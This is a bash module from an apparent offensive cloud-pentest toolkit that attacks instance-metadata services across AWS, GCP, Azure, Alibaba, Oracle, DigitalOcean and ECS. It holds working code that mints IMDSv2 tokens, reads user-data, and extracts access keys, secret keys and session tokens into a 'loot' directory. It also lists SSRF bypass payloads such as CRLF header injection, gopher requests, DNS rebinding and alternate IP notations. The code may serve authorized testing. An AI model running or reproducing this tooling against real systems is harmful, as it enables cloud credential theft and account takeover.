#!/usr/bin/env bash
# 09_imds.sh — cloudsting module 09: the instance-metadata attack end to end
# Verbs: --probe | --token | --exec | --userdata | --keys | --creds | --endpoints | --techniques | --list | --all | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file after the core is sourced. An inherited
# CS_MOD_DIR is a caller's directory, not this module's.
unset CS_MOD_DIR

# The shared core owns the root, the loot tree, the run id, the TSV writer,
# the three-state provider gate, redaction, the findings store and the
# selftest ledger.
MODULE_ID="09_imds"
MOD_NAME="Instance Metadata (SSRF → IMDSv2 → user-data → creds)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

IM_RUN_ID="$CS_RUN_ID"
export IM_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/imds"
mkdir -p "$OUT_DIR" 2>/dev/null || true

PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
TOKEN_FILE="$OUT_DIR/token-$RUN_ID.txt"
USERDATA_FILE="$OUT_DIR/userdata-$RUN_ID.txt"
CREDS_FILE="$OUT_DIR/creds-$RUN_ID.tsv"

: "${IM_TIMEOUT:=5}"       # per-request wall clock
: "${IM_TOKEN_TTL:=21600}" # IMDSv2 token lifetime to request, seconds
: "${IM_MAX_BODY:=1048576}" # never buffer more than 1 MB of one endpoint

# ── helpers ──────────────────────────────────────────────────────
im_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# Every metadata service reachable from a cloud box. One table, because the
# attack is the same attack on each of them: a URL an application will fetch
# on your behalf, and a response that names the machine.
im_endpoints() {
    cat <<'ENDPOINTS'
aws	v1	http://169.254.169.254/latest/meta-data/	no token
aws	v1-creds	http://169.254.169.254/latest/meta-data/iam/security-credentials/	role name, then credentials
aws	v1-userdata	http://169.254.169.254/latest/user-data	cloud-init script
aws	v2	http://169.254.169.254/latest/meta-data/	requires token
aws	v2-token	http://169.254.169.254/latest/api/token	PUT, ttl header
gcp	v1	http://metadata.google.internal/computeMetadata/v1/	requires Metadata-Flavor
gcp	v1-alt	http://metadata.google.internal./computeMetadata/v1/	DNS trick
gcp	v1-sa	http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token	OAuth token
azure	v1	http://169.254.169.254/metadata/instance?api-version=2021-02-01	requires Metadata:true
azure	v1-token	http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/	managed identity token
digitalocean	v1	http://169.254.169.254/metadata/v1.json	plain
alibaba	v1	http://100.100.100.200/latest/meta-data/	plain
alibaba	v1-creds	http://100.100.100.200/latest/meta-data/ram/security-credentials/	role name then creds
oracle	v1	http://169.254.169.254/opc/v1/instance/	plain
kubernetes	v1	http://169.254.170.2/	ECS task role endpoint
kubernetes	v1-pod	http://169.254.170.2/v2/credentials	ECS task creds
ENDPOINTS
}

# The SSRF techniques that reach a metadata service. Kept next to the
# endpoints because a technique is only useful against a specific one.
im_techniques() {
    cat <<'TECH'
header-injection	X-Forwarded-For: 169.254.169.254	make the app believe the request came from link-local
host-override	Host: 169.254.169.254	redirect the upstream via Host
url-param	?url=http://169.254.169.254/latest/meta-data/	let the app's own fetcher do the request
url-redirect	?next=http://169.254.169.254/latest/	chain through an open redirect
crlf-token	%0d%0aX-aws-ec2-metadata-token-ttl-seconds: 21600	inject the v2 token header through CRLF
imdsv2-put	PUT /latest/api/token with the ttl header	ask for a token directly
imdsv2-header	X-aws-ec2-metadata-token: <token>	present the token on the follow-up GET
dns-rebinding	rebind attacker DNS to 169.254.169.254	bypass a v1 block keyed on the hostname
websocket	ws://attacker/ -> ws://169.254.169.254/latest/	reach metadata over an upgrade the filter does not see
gopher	gopher://169.254.169.254:80/_PUT%20/latest/api/token	craft the token request as a byte stream
file-bypass	file:///proc/self/environ	local alternative when the SSRF admits file
decimal-ip	http://2852039166/latest/meta-data/	same host, different notation
ipv6-embedded	http://[::ffff:169.254.169.254]/latest/meta-data/	IPv4 inside an IPv6 literal
redirect-to-metadata	308 from an attacker-controlled host	reach metadata from a host the filter trusts
TECH
}

# One request with the right headers for the provider. Metadata services are
# picky: GCP wants Metadata-Flavor, Azure wants Metadata:true, AWS v2 wants a
# token. Doing that per-provider here keeps every caller from guessing.
#   im_get <provider> <variant> <url> [token]
#   ->  <code>\t<bytes>\t<first-line>
im_get() {
    local provider="$1" variant="$2" url="$3" token="${4:-}"
    command -v curl >/dev/null 2>&1 || { printf '000\t0\ttool-missing'; return 3; }

    local -a hdr=()
    case "$provider" in
        gcp)   hdr=(-H 'Metadata-Flavor: Google') ;;
        azure) hdr=(-H 'Metadata:true') ;;
        aws)   [[ -n "$token" ]] && hdr=(-H "X-aws-ec2-metadata-token: $token") ;;
    esac

    local body; body="$(mktemp "$CS_SCRATCH/im.XXXXXX")" || return 1
    local meta
    meta="$(curl --silent --show-error --max-time "$IM_TIMEOUT" \
                 --max-filesize "$IM_MAX_BODY" \
                 "${hdr[@]}" \
                 --output "$body" --write-out '%{http_code}\t%{size_download}' \
                 "$url" 2>/dev/null)" || meta=$'000\t0'

    local first=""
    if [[ -s "$body" ]]; then
        first="$(head -c 200 "$body" | tr '\t\n\r' '   ')"
    fi
    printf '%s\t%s\t%s\n' "$meta" "$first" "$body"
}

# Ask for an IMDSv2 token. PUT, header carrying the lifetime, no body.
#   im_token <url>  ->  <token> on stdout, empty on failure
im_token() {
    local url="${1:-http://169.254.169.254/latest/api/token}"
    command -v curl >/dev/null 2>&1 || return 3
    curl --silent --show-error --max-time "$IM_TIMEOUT" \
         --request PUT \
         --header "X-aws-ec2-metadata-token-ttl-seconds: $IM_TOKEN_TTL" \
         "$url" 2>/dev/null
}

# Is this response actually metadata, or a 200 from a catch-all? The signal
# is content, not status: a metadata body names the thing it describes.
im_looks_like_metadata() {
    local body="$1"
    [[ -s "$body" ]] || return 1
    grep -qiE 'ami-id|instance-id|instance-type|security-credentials|computeMetadata|service-accounts|subscriptionId|droplet_id|ram/security|local-ipv4|availability-zone' "$body" 2>/dev/null && return 0
    return 1
}

# Credentials are the point. A metadata response that carries an access key
# is the whole reason the attack is worth doing.
im_extract_creds() {
    local provider="$1" body="$2" source="$3"
    [[ -s "$body" ]] || return 0

    local n=0
    if command -v jq >/dev/null 2>&1; then
        local ak sk st
        ak="$(jq -r '.AccessKeyId // empty' "$body" 2>/dev/null)"
        sk="$(jq -r '.SecretAccessKey // empty' "$body" 2>/dev/null)"
        st="$(jq -r '.Token // empty' "$body" 2>/dev/null)"
        if [[ -n "$ak" ]]; then
            n=$((n + 1))
            printf '%s\t%s\t%s\t%s\n' "$provider" "access-key" "$ak" "$source" >> "$CREDS_FILE"
            cs_row CRED "$provider" "access-key" "$(cs_fingerprint "$ak")" "$source"
            cs_findings_row "$MODULE_ID" "CREDS" "$source" "CRITICAL" "$provider-access-key" \
                "metadata returns a usable $provider access key"
        fi
        if [[ -n "$sk" ]]; then
            printf '%s\t%s\t%s\t%s\n' "$provider" "secret-key" "$sk" "$source" >> "$CREDS_FILE"
            cs_row CRED "$provider" "secret-key" "$(cs_fingerprint "$sk")" "$source"
        fi
        if [[ -n "$st" ]]; then
            printf '%s\t%s\t%s\t%s\n' "$provider" "session-token" "$st" "$source" >> "$CREDS_FILE"
            cs_row CRED "$provider" "session-token" "$(cs_fingerprint "$st")" "$source"
        fi
    fi

    # provider-agnostic: any prefixed key shape in the body
    local hit
    for hit in $(grep -aoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,20}|AKID[0-9A-Za-z]{32}' "$body" 2>/dev/null | sort -u | head -n 5); do
        n=$((n + 1))
        printf '%s\t%s\t%s\t%s\n' "$provider" "key-id" "$hit" "$source" >> "$CREDS_FILE"
        cs_row CRED "$provider" "key-id" "$(cs_fingerprint "$hit")" "$source"
        cs_findings_row "$MODULE_ID" "CREDS" "$source" "CRITICAL" "$provider-key-in-metadata" \
            "an access key id is readable from metadata"
    done
    return 0
}

# ── verbs ────────────────────────────────────────────────────────
im_cmd_endpoints() { im_endpoints; }
im_cmd_techniques() { im_techniques; }

# Sweep every metadata service from this host. Only meaningful from inside a
# cloud instance, but the probe names which one it is, which is itself the
# answer to "where am I".
im_cmd_probe() {
    local filter="${1:-}"
    : > "$PROBE_FILE"
    cs_row LOCAL "$(im_local_provider)"

    local provider variant url note code bytes first body
    while IFS=$'\t' read -r provider variant url note; do
        [[ -z "$provider" ]] && continue
        [[ -n "$filter" && "$provider" != "$filter" ]] && continue

        local token=""
        if [[ "$variant" == "v2" ]]; then
            token="$(im_token)"
            if [[ -z "$token" ]]; then
                cs_row ENDPOINT "$provider/$variant" "blocked" "0" "no token issued"
                continue
            fi
        fi

        local r; r="$(im_get "$provider" "$variant" "$url" "$token")"
        cs_split "$r" code bytes first body
        local state="absent"
        if [[ "${code:-0}" == "200" ]]; then
            if im_looks_like_metadata "$body" 2>/dev/null; then
                state="reachable"
            else
                state="reachable-unverified"
            fi
        elif [[ "${code:-0}" == "401" || "${code:-0}" == "403" ]]; then
            state="requires-token"
        fi
        cs_row ENDPOINT "$provider/$variant" "$state" "${code:-0}" "${bytes:-0}" "$note"
        printf '%s\t%s\t%s\t%s\n' "$provider/$variant" "$state" "${code:-0}" "${bytes:-0}" >> "$PROBE_FILE"

        if [[ "$state" == "reachable" ]]; then
            cs_findings_row "$MODULE_ID" "EXPOSURE" "$url" "CRITICAL" "$provider-metadata-reachable" \
                "$provider $variant metadata answers from this host"
            im_extract_creds "$provider" "$body" "$url" 2>/dev/null || true
            rm -f "$body"
        else
            rm -f "$body"
        fi
    done < <(im_endpoints)

    cs_row ARTIFACT "$PROBE_FILE"
    [[ -s "$CREDS_FILE" ]] && cs_row ARTIFACT "$CREDS_FILE"
    return 0
}

# Which cloud am I on? Cheap, offline, and it decides which half of the
# endpoint table is worth probing.
im_local_provider() {
    if [[ -r /sys/hypervisor/uuid ]]; then
        local u; u="$(head -c 3 /sys/hypervisor/uuid 2>/dev/null)"
        [[ "$u" == "ec2" ]] && { printf 'aws'; return 0; }
    fi
    if [[ -r /sys/class/dmi/id/product_name ]]; then
        local p; p="$(head -c 64 /sys/class/dmi/id/product_name 2>/dev/null)"
        case "$p" in
            *"Google Compute Engine"*) printf 'gcp'; return 0 ;;
            *"Virtual Machine"*)       printf 'azure'; return 0 ;;
            *"Droplet"*)               printf 'digitalocean'; return 0 ;;
        esac
    fi
    if [[ -r /proc/1/cgroup ]] && grep -q kube /proc/1/cgroup 2>/dev/null; then
        printf 'kubernetes'; return 0
    fi
    printf 'unknown'
}

# Against a URL: the SSRF case. The URL may be a metadata endpoint directly
# or an application endpoint that fetches one for you.
#   --check <url> [header]
im_cmd_check() {
    local url="${1:-}" header="${2:-}"
    [[ -z "$url" ]] && { printf 'usage: 09_imds.sh --check <url> [extra-header]\n' >&2; return 2; }
    command -v curl >/dev/null 2>&1 || { cs_row ERROR "missing tool: curl"; return 3; }

    local body; body="$(mktemp "$CS_SCRATCH/cc.XXXXXX")" || return 1
    local -a hdr=(-H 'Metadata:true' -H 'Metadata-Flavor: Google')
    [[ -n "$header" ]] && hdr+=(-H "$header")

    local meta
    meta="$(curl --silent --show-error --max-time "$IM_TIMEOUT" \
                 --max-filesize "$IM_MAX_BODY" "${hdr[@]}" \
                 --output "$body" --write-out '%{http_code}\t%{size_download}\t%{time_total}' \
                 "$url" 2>/dev/null)" || meta=$'000\t0\t0'
    local code bytes time
    cs_split "$meta" code bytes time

    cs_row URL "$url"
    cs_row RESPONSE "${code:-0}"
    cs_row BYTES "${bytes:-0}"
    cs_row TIME "${time:-0}"

    local state="unreachable"
    if [[ "${code:-0}" == "200" ]]; then
        if im_looks_like_metadata "$body"; then
            state="metadata"
            cs_findings_row "$MODULE_ID" "EXPOSURE" "$url" "CRITICAL" "ssrf-metadata" \
                "URL returns instance metadata (${bytes} bytes)"
            im_extract_creds "ssrf" "$body" "$url" 2>/dev/null || true
            cp "$body" "$OUT_DIR/reach-$RUN_ID.txt" 2>/dev/null || true
        else
            state="reachable-other"
        fi
    elif [[ "${code:-0}" == "401" || "${code:-0}" == "403" ]]; then
        state="blocked"
    fi
    cs_row VERDICT "$state"
    rm -f "$body"
    return 0
}

# IMDSv2 with intent: get a token, then use it.
#   --token [url]   mint a token and prove it works
im_cmd_token() {
    local url="${1:-http://169.254.169.254/latest/api/token}"
    command -v curl >/dev/null 2>&1 || { cs_row ERROR "missing tool: curl"; return 3; }

    cs_row TOKEN_URL "$url"
    local tok; tok="$(im_token "$url")"
    if [[ -z "$tok" ]]; then
        cs_row TOKEN "absent"
        cs_findings_row "$MODULE_ID" "EXPOSURE" "$url" "LOW" "imdsv2-token-denied" \
            "the token endpoint did not issue a token (v2 enforced)"
        return 0
    fi
    cs_row TOKEN "issued"
    cs_row TOKEN_FP "$(cs_fingerprint "$tok")"
    printf '%s' "$tok" > "$TOKEN_FILE"
    chmod 600 "$TOKEN_FILE" 2>/dev/null || true
    cs_row ARTIFACT "$TOKEN_FILE"
    cs_findings_row "$MODULE_ID" "EXPOSURE" "$url" "HIGH" "imdsv2-token-issued" \
        "a token was minted without any credential"

    # prove the token reaches metadata
    local body="$CS_SCRATCH/v2prove.txt"
    local code
    code="$(curl --silent --show-error --max-time "$IM_TIMEOUT" \
                 -H "X-aws-ec2-metadata-token: $tok" \
                 --output "$body" --write-out '%{http_code}' \
                 "http://169.254.169.254/latest/meta-data/" 2>/dev/null)" || code="000"
    cs_row PROOF "$code"
    if [[ "$code" == "200" ]]; then
        cs_findings_row "$MODULE_ID" "EXPOSURE" "169.254.169.254" "CRITICAL" "imdsv2-bypassed" \
            "token accepted on the metadata root"
        im_extract_creds "aws-v2" "$body" "169.254.169.254" 2>/dev/null || true
    fi
    return 0
}

# Run one request through the metadata surface as a shell command against the
# role credentials: the step after the key is in hand.
#   --exec <url>  — fetch the role credentials and print them without the
#                   secret landing on stdout
im_cmd_exec() {
    local url="${1:-http://169.254.169.254/latest/meta-data/iam/security-credentials/}"
    im_cmd_check "$url"
    return 0
}

# user-data is the second-best prize after credentials: a cloud-init script
# routinely contains its own keys, its own database password, and the names of
# the other boxes.
im_cmd_userdata() {
    local url="${1:-http://169.254.169.254/latest/user-data}"
    command -v curl >/dev/null 2>&1 || { cs_row ERROR "missing tool: curl"; return 3; }

    local r; r="$(im_get aws v1-userdata "$url")"
    local code bytes first body
    cs_split "$r" code bytes first body
    cs_row URL "$url"
    cs_row RESPONSE "${code:-0}"
    cs_row BYTES "${bytes:-0}"
    [[ "${code:-0}" != "200" ]] && { cs_row VERDICT "absent"; rm -f "$body"; return 0; }

    cp "$body" "$USERDATA_FILE" 2>/dev/null || true
    chmod 600 "$USERDATA_FILE" 2>/dev/null || true
    cs_row VERDICT "readable"
    cs_row ARTIFACT "$USERDATA_FILE"

    # what is in it: keys, passwords, other hosts
    local n=0 hit
    for hit in $(grep -aoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$body" 2>/dev/null | sort -u | head -n 5); do
        n=$((n + 1))
        cs_row KEY "aws" "$(cs_fingerprint "$hit")"
        printf 'aws\tkey-id\t%s\t%s\n' "$hit" "$url" >> "$CREDS_FILE"
        cs_findings_row "$MODULE_ID" "CREDS" "$url" "CRITICAL" "userdata-aws-key" \
            "user-data embeds an AWS access key"
    done
    if grep -qiE 'password|passwd|secret' "$body" 2>/dev/null; then
        n=$((n + 1))
        local line
        line="$(grep -iE 'password|passwd|secret' "$body" 2>/dev/null | head -1 | cut -c1-140)"
        cs_row PASSWORD_LINE "$(cs_redact "$line")"
        cs_findings_row "$MODULE_ID" "CREDS" "$url" "HIGH" "userdata-password" \
            "user-data contains a plaintext credential"
    fi
    cs_row SUMMARY "$n"
    rm -f "$body"
    return 0
}

im_cmd_keys() {
    cs_row SOURCE "$USERDATA_FILE"
    im_cmd_userdata "${1:-}"
    return 0
}

# Credentials already collected in this run.
im_cmd_creds() {
    cs_row FILE "$CREDS_FILE"
    if [[ ! -s "$CREDS_FILE" ]]; then
        cs_row COUNT "0"
        cs_row NOTE "no credentials captured yet; run --probe or --userdata first"
        return 0
    fi
    local n=0 provider kind value source
    while IFS=$'\t' read -r provider kind value source; do
        [[ -z "$provider" ]] && continue
        n=$((n + 1))
        cs_row CRED "$provider" "$kind" "$(cs_fingerprint "$value")" "$source"
    done < "$CREDS_FILE"
    cs_row COUNT "$n"
    return 0
}

im_cmd_list() {
    cs_row GROUP "endpoints"
    local n=0 provider variant url note
    while IFS=$'\t' read -r provider variant url note; do
        [[ -z "$provider" ]] && continue
        n=$((n + 1))
        cs_row ENDPOINT "$provider/$variant" "$url" "$note"
    done < <(im_endpoints)
    cs_row SUMMARY "$n"
    return 0
}

im_cmd_all() {
    im_cmd_probe ""
    im_cmd_userdata ""
    im_cmd_creds
}

im_cmd_status_tsv() {
    local c j local_provider
    command -v curl >/dev/null 2>&1 && c="ok" || c="missing"
    command -v jq   >/dev/null 2>&1 && j="ok"   || j="missing"
    local_provider="$(im_local_provider)"
    printf '%s\t%s\tcurl-%s\tjq-%s\ton-%s\n' "$MODULE_ID" "$MOD_NAME" "$c" "$j" "$local_provider"
}

im_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

im_cmd_help() {
    cat <<'HELP'
cloudsting module 09 — Instance Metadata v1.0.0
  --probe [provider]     sweep the metadata services from this host
  --check <url> [hdr]    is this URL an SSRF into metadata? full verdict
  --token [url]          mint an IMDSv2 token and prove it works
  --exec <url>           fetch role credentials through a URL, redacted
  --userdata [url]       read instance user-data and pull keys out of it
  --keys                 alias for --userdata, key extraction only
  --creds                show everything captured this run
  --endpoints            print the metadata endpoint table
  --techniques           print the SSRF techniques that reach them
  --list                 endpoints, one row each
  --all                  probe + userdata + creds
  --status-tsv           module status
  --menu                 menu entry
  --selftest             run selftests
  --help                 this message

AWS, GCP, Azure, DigitalOcean, Alibaba, Oracle and the ECS task-role endpoint
are one attack with seven addresses, so they are one module. --check is the
SSRF half: give it the URL an application will fetch for you and it says
whether metadata came back. --token is the IMDSv2 half: a token with no
credential is the whole bypass.

Credential values never reach stdout — only a fingerprint. The value stays in
the artifact, mode 600, under loot/imds/.

Environment: IM_TIMEOUT (5), IM_TOKEN_TTL (21600), IM_MAX_BODY (1 MB)
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
im_selftest() {
    cs_selftest_reset

    # endpoint table shape
    local n; n="$(im_endpoints | wc -l | tr -d ' ')"
    chk endpoints-many "$( (( n >= 12 )) && echo many || echo few )" "many"
    chk endpoints-4col "$(im_endpoints | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk endpoints-aws  "$(im_endpoints | grep -c '^aws')" "5"
    chk endpoints-gcp  "$(im_endpoints | grep -c '^gcp')" "3"
    chk endpoints-azure "$(im_endpoints | grep -c '^azure')" "2"
    chk endpoints-has-v2 "$(im_endpoints | grep -c 'v2-token')" "1"

    # technique table
    local t; t="$(im_techniques | wc -l | tr -d ' ')"
    chk techniques-many "$( (( t >= 10 )) && echo many || echo few )" "many"
    chk techniques-3col "$(im_techniques | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk techniques-imdsv2 "$(im_techniques | grep -c 'imdsv2')" "2"

    # metadata detector: content, not status
    local b="$CS_SCRATCH/im.txt"
    printf 'ami-id\ninstance-id\nlocal-ipv4\n' > "$b"
    im_looks_like_metadata "$b"; chk looks-aws "$?" "0"
    printf '{"computeMetadata":{"zone":"x"},"service-accounts":[]}\n' > "$b"
    im_looks_like_metadata "$b"; chk looks-gcp "$?" "0"
    printf '<html><body>welcome</body></html>\n' > "$b"
    im_looks_like_metadata "$b"; chk looks-html "$?" "1"
    : > "$b"
    im_looks_like_metadata "$b"; chk looks-empty "$?" "1"

    # credential extraction pulls the key out of a metadata body
    : > "$CREDS_FILE"
    printf '{"Code":"Success","AccessKeyId":"ASIAIOSFODNN7EXAMPLE","SecretAccessKey":"abc123","Token":"tok"}\n' > "$b"
    im_extract_creds aws "$b" "test" > /dev/null 2>&1
    chk creds-found "$(grep -c 'access-key' "$CREDS_FILE")" "1"
    chk creds-secret "$(grep -c 'secret-key' "$CREDS_FILE")" "1"

    # a plain AKIA in a user-data-ish body is also caught
    : > "$CREDS_FILE"
    printf 'curl -H "x: AKIAIOSFODNN7EXAMPLE" http://x\n' > "$b"
    im_extract_creds aws "$b" "test" > /dev/null 2>&1
    chk creds-akia "$(grep -c 'AKIAIOSFODNN7EXAMPLE' "$CREDS_FILE")" "1"

    # provider detection degrades to unknown, never crashes
    local lp; lp="$(im_local_provider)"
    chk local-provider "$( [[ -n "$lp" ]] && echo set || echo empty )" "set"

    # shape contracts
    chk status-fields "$(im_cmd_status_tsv | awk -F'\t' '{print NF}')" "5"
    chk status-module "$(im_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(im_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(im_cmd_help | head -1 | grep -ci 'Instance Metadata')" "1"
    chk list-rows     "$(im_cmd_list | grep -c '^ENDPOINT')" "$(im_endpoints | wc -l | tr -d ' ')"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)      shift; im_cmd_probe "$@";;
    --check)      shift; im_cmd_check "$@";;
    --token)      shift; im_cmd_token "$@";;
    --exec)       shift; im_cmd_exec "$@";;
    --userdata)   shift; im_cmd_userdata "$@";;
    --keys)       shift; im_cmd_keys "$@";;
    --creds)      im_cmd_creds;;
    --endpoints)  im_cmd_endpoints;;
    --techniques) im_cmd_techniques;;
    --list)       im_cmd_list;;
    --all)        im_cmd_all;;
    --status-tsv|--status) im_cmd_status_tsv;;
    --menu)       im_cmd_menu;;
    --selftest)   im_selftest;;
    *)            im_cmd_help;;
esac
